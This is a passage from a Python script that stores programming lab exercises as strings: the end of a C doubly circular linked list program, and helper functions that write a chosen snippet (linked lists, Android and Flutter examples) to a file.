    if (temp->next == head && position > 0) {
        printf("Invalid position\n");
        free(newNode);
        return;
    }

    newNode->next = temp->next;
    newNode->prev = temp;
    temp->next->prev = newNode;
    temp->next = newNode;

    if (temp == tail) {
        tail = newNode;
    }
}

void deleteAtFirst() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    
    struct Node* temp = head;

    if (head == tail) { 
        free(head);
        head = tail = NULL;
        return;
    }

    head = head->next;
    head->prev = tail;
    tail->next = head;

    free(temp);
}

void deleteAtEnd() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    
    if (head == tail) { 
        free(head);
        head = tail = NULL;
        return;
    }

    struct Node* temp = tail;
    tail = tail->prev;
    tail->next = head;
    head->prev = tail;

    free(temp);
}

void deleteNPosition(int position) {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    if (position == 0) {
        deleteAtFirst();
        return;
    }

    struct Node* temp = head;
    
    for (int i = 0; i < position && temp->next != head; i++) {
        temp = temp->next;
    }

    if (temp == head) {
        printf("Invalid position\n");
        return;
    }

    temp->prev->next = temp->next;
    temp->next->prev = temp->prev;

    if (temp == tail) {
        tail = temp->prev;
    }

    free(temp);
}

void display() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }

    struct Node* temp = head;
    printf("Forward: ");
    do {
        printf("%d <-> ", temp->data);
        temp = temp->next;
    } while (temp != head);
    printf("(back to head)\n");

    printf("Backward: ");
    temp = tail;
    do {
        printf("%d <-> ", temp->data);
        temp = temp->prev;
    } while (temp != tail);
    printf("(back to tail)\n");
}

int main() {
    insertAtEnd(1);
    insertAtEnd(2);
    insertAtEnd(3);
    insertAtEnd(4);
    insertAtEnd(5);
    insertAtStart(10);
    insertAtNPosition(15, 2);
    display();

    deleteAtFirst();
    deleteAtEnd();
    deleteNPosition(2);
    display();

    return 0;
}
'''

def iss_():
    for file,code in iss_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(iss_codes[filename])
        
def itc_():
    for file,code in itc_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(itc_codes[filename])


mob_codes = {
    "toast.txt": toast,
    "listview.txt": listview,
    "checkbox.txt": checkbox,
    "dateTime.txt": dateTime,
    "oneActToOther.txt": oneActToOtherAndToast,
    'radiobtn.txt': radiobtn,
    'sharedPref.txt': sharedPrefrence,
    'loginForm.txt': loginForm,
    'lifecycle.txt': lifecycle,
    'flutter1.txt':fluterexp1,
    'flutter2.txt':flutterexp2

}

def mob_():
    for file,code in mob_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(mob_codes[filename])
        

dsa_codes = {
    "singly_linked_list.txt": singly_linked_list,
    "doubly_linked_list.txt": doubly_linked_list,
    "circular_linked_list.txt": circular_linked_list,
    "doubly_circular_linked_list.txt": doubly_circular_linked_list
}

def dsa_():
    for file,code in dsa_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(dsa_codes[filename])
          